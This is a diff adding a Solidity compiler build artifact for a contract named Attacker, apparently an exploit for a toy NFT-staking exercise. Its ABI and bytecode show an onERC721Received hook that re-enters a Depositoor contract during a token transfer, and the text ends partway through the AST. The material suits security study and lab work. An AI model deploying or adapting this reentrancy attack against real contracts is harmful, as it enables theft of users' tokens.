@@ -1,0 +1,1426 @@
+{
+  "abi": [
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "depositoor",
+      "outputs": [
+        {
+          "internalType": "contract Depositoor",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "nft",
+      "outputs": [
+        {
+          "internalType": "contract NftToStake",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        },
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        },
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        },
+        {
+          "internalType": "bytes",
+          "name": "",
+          "type": "bytes"
+        }
+      ],
+      "name": "onERC721Received",
+      "outputs": [
+        {
+          "internalType": "bytes4",
+          "name": "",
+          "type": "bytes4"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "contract NftToStake",
+          "name": "_nft",
+          "type": "address"
+        },
+        {
+          "internalType": "contract Depositoor",
+          "name": "_depositoor",
+          "type": "address"
+        }
+      ],
+      "name": "setContracts",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "transfer",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }
+  ],
+  "bytecode": {
+    "object": "0x608060405234801561001057600080fd5b5061035d806100206000396000f3fe608060405234801561001057600080fd5b50600436106100625760003560e01c8063150b7a02146100675780633bffcb631461009857806347ccca02146100c35780638a4068dd146100d65780639e5faafc146100e0578063d8952a49146100e8575b600080fd5b61007a61007536600461024f565b610124565b6040516001600160e01b031990911681526020015b60405180910390f35b6001546100ab906001600160a01b031681565b6040516001600160a01b03909116815260200161008f565b6000546100ab906001600160a01b031681565b6100de610195565b005b6100de610206565b6100de6100f63660046102ee565b600080546001600160a01b039384166001600160a01b03199182161790915560018054929093169116179055565b6001546040516324b1babf60e01b8152602a60048201526000916001600160a01b0316906324b1babf90602401600060405180830381600087803b15801561016b57600080fd5b505af115801561017f573d6000803e3d6000fd5b50630a85bd0160e11b9998505050505050505050565b600054600154604051632142170760e11b81523060048201526001600160a01b039182166024820152602a60448201529116906342842e0e906064015b600060405180830381600087803b1580156101ec57600080fd5b505af1158015610200573d6000803e3d6000fd5b50505050565b60015460405163d83ba73760e01b8152602a60048201526001600160a01b039091169063d83ba737906024016101d2565b6001600160a01b038116811461024c57600080fd5b50565b60008060008060006080868803121561026757600080fd5b853561027281610237565b9450602086013561028281610237565b935060408601359250606086013567ffffffffffffffff808211156102a657600080fd5b818801915088601f8301126102ba57600080fd5b8135818111156102c957600080fd5b8960208285010111156102db57600080fd5b9699959850939650602001949392505050565b6000806040838503121561030157600080fd5b823561030c81610237565b9150602083013561031c81610237565b80915050925092905056fea26469706673582212202390f619b40954fc8157d40233c39304cbb3bbc0731eea3d463bdbd954e7c86864736f6c634300080f0033",
+    "sourceMap": "164:674:31:-:0;;;;;;;;;;;;;;;;;;;",
+    "linkReferences": {}
+  },
+  "deployedBytecode": {
+    "object": "0x608060405234801561001057600080fd5b50600436106100625760003560e01c8063150b7a02146100675780633bffcb631461009857806347ccca02146100c35780638a4068dd146100d65780639e5faafc146100e0578063d8952a49146100e8575b600080fd5b61007a61007536600461024f565b610124565b6040516001600160e01b031990911681526020015b60405180910390f35b6001546100ab906001600160a01b031681565b6040516001600160a01b03909116815260200161008f565b6000546100ab906001600160a01b031681565b6100de610195565b005b6100de610206565b6100de6100f63660046102ee565b600080546001600160a01b039384166001600160a01b03199182161790915560018054929093169116179055565b6001546040516324b1babf60e01b8152602a60048201526000916001600160a01b0316906324b1babf90602401600060405180830381600087803b15801561016b57600080fd5b505af115801561017f573d6000803e3d6000fd5b50630a85bd0160e11b9998505050505050505050565b600054600154604051632142170760e11b81523060048201526001600160a01b039182166024820152602a60448201529116906342842e0e906064015b600060405180830381600087803b1580156101ec57600080fd5b505af1158015610200573d6000803e3d6000fd5b50505050565b60015460405163d83ba73760e01b8152602a60048201526001600160a01b039091169063d83ba737906024016101d2565b6001600160a01b038116811461024c57600080fd5b50565b60008060008060006080868803121561026757600080fd5b853561027281610237565b9450602086013561028281610237565b935060408601359250606086013567ffffffffffffffff808211156102a657600080fd5b818801915088601f8301126102ba57600080fd5b8135818111156102c957600080fd5b8960208285010111156102db57600080fd5b9699959850939650602001949392505050565b6000806040838503121561030157600080fd5b823561030c81610237565b9150602083013561031c81610237565b80915050925092905056fea26469706673582212202390f619b40954fc8157d40233c39304cbb3bbc0731eea3d463bdbd954e7c86864736f6c634300080f0033",
+    "sourceMap": "164:674:31:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;599:237;;;;;;:::i;:::-;;:::i;:::-;;;-1:-1:-1;;;;;;1253:33:34;;;1235:52;;1223:2;1208:18;599:237:31;;;;;;;;215:28;;;;;-1:-1:-1;;;;;215:28:31;;;;;;-1:-1:-1;;;;;1482:32:34;;;1464:51;;1452:2;1437:18;215:28:31;1298:223:34;188:21:31;;;;;-1:-1:-1;;;;;188:21:31;;;389:115;;;:::i;:::-;;510:83;;;:::i;250:133::-;;;;;;:::i;:::-;332:3;:10;;-1:-1:-1;;;;;332:10:31;;;-1:-1:-1;;;;;;332:10:31;;;;;;;;352:24;;;;;;;;;;;250:133;599:237;742:10;;:28;;-1:-1:-1;;;742:28:31;;767:2;742:28;;;2342:25:34;724:6:31;;-1:-1:-1;;;;;742:10:31;;:24;;2315:18:34;;742:28:31;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;788:41:31;599:237;-1:-1:-1;;;;;;;;;599:237:31:o;389:115::-;436:3;;;481:10;428:69;;-1:-1:-1;;;428:69:31;;466:4;428:69;;;2627:34:34;-1:-1:-1;;;;;481:10:31;;;2677:18:34;;;2670:43;494:2:31;2729:18:34;;;2722:34;436:3:31;;;428:29;;2562:18:34;;428:69:31;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;389:115::o;510:83::-;547:10;;:39;;-1:-1:-1;;;547:39:31;;583:2;547:39;;;2342:25:34;-1:-1:-1;;;;;547:10:31;;;;:35;;2315:18:34;;547:39:31;2187:186:34;14:131;-1:-1:-1;;;;;89:31:34;;79:42;;69:70;;135:1;132;125:12;69:70;14:131;:::o;150:936::-;247:6;255;263;271;279;332:3;320:9;311:7;307:23;303:33;300:53;;;349:1;346;339:12;300:53;388:9;375:23;407:31;432:5;407:31;:::i;:::-;457:5;-1:-1:-1;514:2:34;499:18;;486:32;527:33;486:32;527:33;:::i;:::-;579:7;-1:-1:-1;633:2:34;618:18;;605:32;;-1:-1:-1;688:2:34;673:18;;660:32;711:18;741:14;;;738:34;;;768:1;765;758:12;738:34;806:6;795:9;791:22;781:32;;851:7;844:4;840:2;836:13;832:27;822:55;;873:1;870;863:12;822:55;913:2;900:16;939:2;931:6;928:14;925:34;;;955:1;952;945:12;925:34;1000:7;995:2;986:6;982:2;978:15;974:24;971:37;968:57;;;1021:1;1018;1011:12;968:57;150:936;;;;-1:-1:-1;150:936:34;;-1:-1:-1;1052:2:34;1044:11;;1074:6;150:936;-1:-1:-1;;;150:936:34:o;1754:428::-;1862:6;1870;1923:2;1911:9;1902:7;1898:23;1894:32;1891:52;;;1939:1;1936;1929:12;1891:52;1978:9;1965:23;1997:31;2022:5;1997:31;:::i;:::-;2047:5;-1:-1:-1;2104:2:34;2089:18;;2076:32;2117:33;2076:32;2117:33;:::i;:::-;2169:7;2159:17;;;1754:428;;;;;:::o",
+    "linkReferences": {}
+  },
+  "methodIdentifiers": {
+    "attack()": "9e5faafc",
+    "depositoor()": "3bffcb63",
+    "nft()": "47ccca02",
+    "onERC721Received(address,address,uint256,bytes)": "150b7a02",
+    "setContracts(address,address)": "d8952a49",
+    "transfer()": "8a4068dd"
+  },
+  "rawMetadata": "{\"compiler\":{\"version\":\"0.8.15+commit.e14f2714\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"depositoor\",\"outputs\":[{\"internalType\":\"contract Depositoor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"nft\",\"outputs\":[{\"internalType\":\"contract NftToStake\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"name\":\"onERC721Received\",\"outputs\":[{\"internalType\":\"bytes4\",\"name\":\"\",\"type\":\"bytes4\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract NftToStake\",\"name\":\"_nft\",\"type\":\"address\"},{\"internalType\":\"contract Depositoor\",\"name\":\"_depositoor\",\"type\":\"address\"}],\"name\":\"setContracts\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/Attacker.sol\":\"Attacker\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[\":ds-test/=lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts/=lib/openzeppelin-contracts/\"]},\"sources\":{\"lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\":{\"keccak256\":\"0x4ffc0547c02ad22925310c585c0f166f8759e2648a09e9b489100c42f15dd98d\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://15f52f51413a9de1ff191e2f6367c62178e1df7806d7880fe857a98b0b66253d\",\"dweb:/ipfs/QmaQG1fwfgUt5E9nu2cccFiV47B2V78MM1tCy1qB7n4MsH\"]},\"lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Capped.sol\":{\"keccak256\":\"0x3fe04ed1daf0f12454333fde982a25b103860d8a010dd5d8479b83ebf1dfb788\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8322152771e94c9e28a3bd9e7c9d5dd4fdd00ae214f95915962a6638d8dfc7d6\",\"dweb:/ipfs/QmaXJvF3UjRHacx3nPgt94DwAuXCkEoz6fS7MLr2jbuJyW\"]},\"lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"keccak256\":\"0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd\",\"dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8\"]},\"lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol\":{\"keccak256\":\"0x1e854874c68bec05be100dc0092cb5fbbc71253d370ae98ddef248bbfc3fe118\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://ef0fb6e809779426dc2ac201149bbad4aecdc5810874f2843b050e8b5fef8d30\",\"dweb:/ipfs/QmPDRjaNxmcyxLUKvv8Fxk5eWcf7xvC5S9JpbtqvE7Cadu\"]},\"lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol\":{\"keccak256\":\"0xab28a56179c1db258c9bf5235b382698cb650debecb51b23d12be9e241374b68\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://daae589a9d6fa7e55f99f86c0a16796ca490f243fb3693632c3711c0646c1d56\",\"dweb:/ipfs/QmR3zpd7wNw3rcUdekwiv6FYHJqksuTCXLVioTxu6Fbxk3\"]},\"lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol\":{\"keccak256\":\"0xa82b58eca1ee256be466e536706850163d2ec7821945abd6b4778cfb3bee37da\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6e75cf83beb757b8855791088546b8337e9d4684e169400c20d44a515353b708\",\"dweb:/ipfs/QmYvPafLfoquiDMEj7CKHtvbgHu7TJNPSVPSCjrtjV8HjV\"]},\"lib/openzeppelin-contracts/contracts/token/ERC721/extensions/IERC721Metadata.sol\":{\"keccak256\":\"0x75b829ff2f26c14355d1cba20e16fe7b29ca58eb5fef665ede48bc0f9c6c74b9\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://a0a107160525724f9e1bbbab031defc2f298296dd9e331f16a6f7130cec32146\",\"dweb:/ipfs/QmemujxSd7gX8A9M8UwmNbz4Ms3U9FG9QfudUgxwvTmPWf\"]},\"lib/openzeppelin-contracts/contracts/utils/Address.sol\":{\"keccak256\":\"0xf96f969e24029d43d0df89e59d365f277021dac62b48e1c1e3ebe0acdd7f1ca1\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://ec772b45a624be516f1c81970caa8a2e144301e9d0921cbc1a2789fef39a1269\",\"dweb:/ipfs/QmNyjwxCrGhQMyzLD93oUobJXVe9ceJvRvfXwbEtuxPiEj\"]},\"lib/openzeppelin-contracts/contracts/utils/Context.sol\":{\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92\",\"dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3\"]},\"lib/openzeppelin-contracts/contracts/utils/Strings.sol\":{\"keccak256\":\"0xa4d1d62251f8574deb032a35fc948386a9b4de74b812d4f545a1ac120486b48a\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8c969013129ba9e651a20735ef659fef6d8a1139ea3607bd4b26ddea2d645634\",\"dweb:/ipfs/QmVhVa6LGuzAcB8qgDtVHRkucn4ihj5UZr8xBLcJkP6ucb\"]},\"lib/openzeppelin-contracts/contracts/utils/introspection/ERC165.sol\":{\"keccak256\":\"0xd10975de010d89fd1c78dc5e8a9a7e7f496198085c151648f20cba166b32582b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://fb0048dee081f6fffa5f74afc3fb328483c2a30504e94a0ddd2a5114d731ec4d\",\"dweb:/ipfs/QmZptt1nmYoA5SgjwnSgWqgUSDgm4q52Yos3xhnMv3MV43\"]},\"lib/openzeppelin-contracts/contracts/utils/introspection/IERC165.sol\":{\"keccak256\":\"0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://be161e54f24e5c6fae81a12db1a8ae87bc5ae1b0ddc805d82a1440a68455088f\",\"dweb:/ipfs/QmP7C3CHdY9urF4dEMb9wmsp1wMxHF6nhA2yQE5SKiPAdy\"]},\"lib/openzeppelin-contracts/contracts/utils/math/Math.sol\":{\"keccak256\":\"0xa1e8e83cd0087785df04ac79fb395d9f3684caeaf973d9e2c71caef723a3a5d6\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://33bbf48cc069be677705037ba7520c22b1b622c23b33e1a71495f2d36549d40b\",\"dweb:/ipfs/Qmct36zWXv3j7LZB83uwbg7TXwnZSN1fqHNDZ93GG98bGz\"]},\"src/Attacker.sol\":{\"keccak256\":\"0x4d52b24466d1b32241f822f65161c3d46eb868c1af7d31f2db9577c9145c1d4d\",\"license\":\"GPL-3.0\",\"urls\":[\"bzz-raw://37f6c8c023091790397cf131fc5af732a8d4a89d05d80148408a3a616efb6b6b\",\"dweb:/ipfs/QmcXJ7YM3n79GFB9BdMmTw4hKaYPYbrgF3Jrm5D7Nx3Qr3\"]},\"src/RewardToken.sol\":{\"keccak256\":\"0x25acb2e0dcb410411fa77dd46d7518d671a59c1e7f6919da1005571225601a5e\",\"license\":\"GPL-3.0\",\"urls\":[\"bzz-raw://0cda12ed9f9ca68e678f25e64b2c1d966b712ba0e292d63ce138c764194bc127\",\"dweb:/ipfs/Qme8J7sFJc4PGvGc5hPiaepFf7GARdQAZp8aW764saJBJt\"]}},\"version\":1}",
+  "metadata": {
+    "compiler": {
+      "version": "0.8.15+commit.e14f2714"
+    },
+    "language": "Solidity",
+    "output": {
+      "abi": [
+        {
+          "inputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function",
+          "name": "attack"
+        },
+        {
+          "inputs": [],
+          "stateMutability": "view",
+          "type": "function",
+          "name": "depositoor",
+          "outputs": [
+            {
+              "internalType": "contract Depositoor",
+              "name": "",
+              "type": "address"
+            }
+          ]
+        },
+        {
+          "inputs": [],
+          "stateMutability": "view",
+          "type": "function",
+          "name": "nft",
+          "outputs": [
+            {
+              "internalType": "contract NftToStake",
+              "name": "",
+              "type": "address"
+            }
+          ]
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "",
+              "type": "address"
+            },
+            {
+              "internalType": "address",
+              "name": "",
+              "type": "address"
+            },
+            {
+              "internalType": "uint256",
+              "name": "",
+              "type": "uint256"
+            },
+            {
+              "internalType": "bytes",
+              "name": "",
+              "type": "bytes"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "function",
+          "name": "onERC721Received",
+          "outputs": [
+            {
+              "internalType": "bytes4",
+              "name": "",
+              "type": "bytes4"
+            }
+          ]
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "contract NftToStake",
+              "name": "_nft",
+              "type": "address"
+            },
+            {
+              "internalType": "contract Depositoor",
+              "name": "_depositoor",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "function",
+          "name": "setContracts"
+        },
+        {
+          "inputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function",
+          "name": "transfer"
+        }
+      ],
+      "devdoc": {
+        "kind": "dev",
+        "methods": {},
+        "version": 1
+      },
+      "userdoc": {
+        "kind": "user",
+        "methods": {},
+        "version": 1
+      }
+    },
+    "settings": {
+      "remappings": [
+        ":ds-test/=lib/forge-std/lib/ds-test/src/",
+        ":erc4626-tests/=lib/openzeppelin-contracts/lib/erc4626-tests/",
+        ":forge-std/=lib/forge-std/src/",
+        ":openzeppelin-contracts/=lib/openzeppelin-contracts/"
+      ],
+      "optimizer": {
+        "enabled": true,
+        "runs": 200
+      },
+      "metadata": {
+        "bytecodeHash": "ipfs"
+      },
+      "compilationTarget": {
+        "src/Attacker.sol": "Attacker"
+      },
+      "libraries": {}
+    },
+    "sources": {
+      "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol": {
+        "keccak256": "0x4ffc0547c02ad22925310c585c0f166f8759e2648a09e9b489100c42f15dd98d",
+        "urls": [
+          "bzz-raw://15f52f51413a9de1ff191e2f6367c62178e1df7806d7880fe857a98b0b66253d",
+          "dweb:/ipfs/QmaQG1fwfgUt5E9nu2cccFiV47B2V78MM1tCy1qB7n4MsH"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol": {
+        "keccak256": "0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b",
+        "urls": [
+          "bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34",
+          "dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Capped.sol": {
+        "keccak256": "0x3fe04ed1daf0f12454333fde982a25b103860d8a010dd5d8479b83ebf1dfb788",
+        "urls": [
+          "bzz-raw://8322152771e94c9e28a3bd9e7c9d5dd4fdd00ae214f95915962a6638d8dfc7d6",
+          "dweb:/ipfs/QmaXJvF3UjRHacx3nPgt94DwAuXCkEoz6fS7MLr2jbuJyW"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
+        "keccak256": "0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca",
+        "urls": [
+          "bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd",
+          "dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol": {
+        "keccak256": "0x1e854874c68bec05be100dc0092cb5fbbc71253d370ae98ddef248bbfc3fe118",
+        "urls": [
+          "bzz-raw://ef0fb6e809779426dc2ac201149bbad4aecdc5810874f2843b050e8b5fef8d30",
+          "dweb:/ipfs/QmPDRjaNxmcyxLUKvv8Fxk5eWcf7xvC5S9JpbtqvE7Cadu"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol": {
+        "keccak256": "0xab28a56179c1db258c9bf5235b382698cb650debecb51b23d12be9e241374b68",
+        "urls": [
+          "bzz-raw://daae589a9d6fa7e55f99f86c0a16796ca490f243fb3693632c3711c0646c1d56",
+          "dweb:/ipfs/QmR3zpd7wNw3rcUdekwiv6FYHJqksuTCXLVioTxu6Fbxk3"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol": {
+        "keccak256": "0xa82b58eca1ee256be466e536706850163d2ec7821945abd6b4778cfb3bee37da",
+        "urls": [
+          "bzz-raw://6e75cf83beb757b8855791088546b8337e9d4684e169400c20d44a515353b708",
+          "dweb:/ipfs/QmYvPafLfoquiDMEj7CKHtvbgHu7TJNPSVPSCjrtjV8HjV"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC721/extensions/IERC721Metadata.sol": {
+        "keccak256": "0x75b829ff2f26c14355d1cba20e16fe7b29ca58eb5fef665ede48bc0f9c6c74b9",
+        "urls": [
+          "bzz-raw://a0a107160525724f9e1bbbab031defc2f298296dd9e331f16a6f7130cec32146",
+          "dweb:/ipfs/QmemujxSd7gX8A9M8UwmNbz4Ms3U9FG9QfudUgxwvTmPWf"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/Address.sol": {
+        "keccak256": "0xf96f969e24029d43d0df89e59d365f277021dac62b48e1c1e3ebe0acdd7f1ca1",
+        "urls": [
+          "bzz-raw://ec772b45a624be516f1c81970caa8a2e144301e9d0921cbc1a2789fef39a1269",
+          "dweb:/ipfs/QmNyjwxCrGhQMyzLD93oUobJXVe9ceJvRvfXwbEtuxPiEj"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/Context.sol": {
+        "keccak256": "0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7",
+        "urls": [
+          "bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92",
+          "dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/Strings.sol": {
+        "keccak256": "0xa4d1d62251f8574deb032a35fc948386a9b4de74b812d4f545a1ac120486b48a",
+        "urls": [
+          "bzz-raw://8c969013129ba9e651a20735ef659fef6d8a1139ea3607bd4b26ddea2d645634",
+          "dweb:/ipfs/QmVhVa6LGuzAcB8qgDtVHRkucn4ihj5UZr8xBLcJkP6ucb"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/introspection/ERC165.sol": {
+        "keccak256": "0xd10975de010d89fd1c78dc5e8a9a7e7f496198085c151648f20cba166b32582b",
+        "urls": [
+          "bzz-raw://fb0048dee081f6fffa5f74afc3fb328483c2a30504e94a0ddd2a5114d731ec4d",
+          "dweb:/ipfs/QmZptt1nmYoA5SgjwnSgWqgUSDgm4q52Yos3xhnMv3MV43"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/introspection/IERC165.sol": {
+        "keccak256": "0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1",
+        "urls": [
+          "bzz-raw://be161e54f24e5c6fae81a12db1a8ae87bc5ae1b0ddc805d82a1440a68455088f",
+          "dweb:/ipfs/QmP7C3CHdY9urF4dEMb9wmsp1wMxHF6nhA2yQE5SKiPAdy"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/math/Math.sol": {
+        "keccak256": "0xa1e8e83cd0087785df04ac79fb395d9f3684caeaf973d9e2c71caef723a3a5d6",
+        "urls": [
+          "bzz-raw://33bbf48cc069be677705037ba7520c22b1b622c23b33e1a71495f2d36549d40b",
+          "dweb:/ipfs/Qmct36zWXv3j7LZB83uwbg7TXwnZSN1fqHNDZ93GG98bGz"
+        ],
+        "license": "MIT"
+      },
+      "src/Attacker.sol": {
+        "keccak256": "0x4d52b24466d1b32241f822f65161c3d46eb868c1af7d31f2db9577c9145c1d4d",
+        "urls": [
+          "bzz-raw://37f6c8c023091790397cf131fc5af732a8d4a89d05d80148408a3a616efb6b6b",
+          "dweb:/ipfs/QmcXJ7YM3n79GFB9BdMmTw4hKaYPYbrgF3Jrm5D7Nx3Qr3"
+        ],
+        "license": "GPL-3.0"
+      },
+      "src/RewardToken.sol": {
+        "keccak256": "0x25acb2e0dcb410411fa77dd46d7518d671a59c1e7f6919da1005571225601a5e",
+        "urls": [
+          "bzz-raw://0cda12ed9f9ca68e678f25e64b2c1d966b712ba0e292d63ce138c764194bc127",
+          "dweb:/ipfs/Qme8J7sFJc4PGvGc5hPiaepFf7GARdQAZp8aW764saJBJt"
+        ],
+        "license": "GPL-3.0"
+      }
+    },
+    "version": 1
+  },
+  "ast": {
+    "absolutePath": "src/Attacker.sol",
+    "id": 32470,
+    "exportedSymbols": {
+      "Address": [
+        31289
+      ],
+      "Attacker": [
+        32469
+      ],
+      "Context": [
+        31311
+      ],
+      "Depositoor": [
+        32776
+      ],
+      "ERC165": [
+        31510
+      ],
+      "ERC20": [
+        29703
+      ],
+      "ERC20Capped": [
+        29846
+      ],
+      "ERC721": [
+        30798
+      ],
+      "IERC165": [
+        31522
+      ],
+      "IERC20": [
+        29781
+      ],
+      "IERC20Metadata": [
+        29871
+      ],
+      "IERC721": [
+        30914
+      ],
+      "IERC721Metadata": [
+        30959
+      ],
+      "IERC721Receiver": [
+        30932
+      ],
+      "Math": [
+        32387
+      ],
+      "NftToStake": [
+        32517
+      ],
+      "RewardToken": [
+        32499
+      ],
+      "Strings": [
+        31486
+      ]
+    },
+    "nodeType": "SourceUnit",
+    "src": "35:804:31",
+    "nodes": [
+      {
+        "id": 32389,
+        "nodeType": "PragmaDirective",
+        "src": "35:23:31",
+        "nodes": [],
+        "literals": [
+          "solidity",
+          "0.8",
+          ".15"
+        ]
+      },
+      {
+        "id": 32390,
+        "nodeType": "ImportDirective",
+        "src": "60:74:31",
+        "nodes": [],
+        "absolutePath": "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol",
+        "file": "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol",
+        "nameLocation": "-1:-1:-1",
+        "scope": 32470,
+        "sourceUnit": 30915,
+        "symbolAliases": [],
+        "unitAlias": ""
+      },
+      {
+        "id": 32391,
+        "nodeType": "ImportDirective",
+        "src": "135:27:31",
+        "nodes": [],
+        "absolutePath": "src/RewardToken.sol",
+        "file": "./RewardToken.sol",
+        "nameLocation": "-1:-1:-1",
+        "scope": 32470,
+        "sourceUnit": 32777,
+        "symbolAliases": [],
+        "unitAlias": ""
+      },
+      {
+        "id": 32469,
+        "nodeType": "ContractDefinition",
+        "src": "164:674:31",
+        "nodes": [
+          {
+            "id": 32394,
+            "nodeType": "VariableDeclaration",
+            "src": "188:21:31",
+            "nodes": [],
+            "constant": false,
+            "functionSelector": "47ccca02",
+            "mutability": "mutable",
+            "name": "nft",
+            "nameLocation": "206:3:31",
+            "scope": 32469,
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_NftToStake_$32517",
+              "typeString": "contract NftToStake"
+            },
+            "typeName": {
+              "id": 32393,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 32392,
+                "name": "NftToStake",
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 32517,
+                "src": "188:10:31"
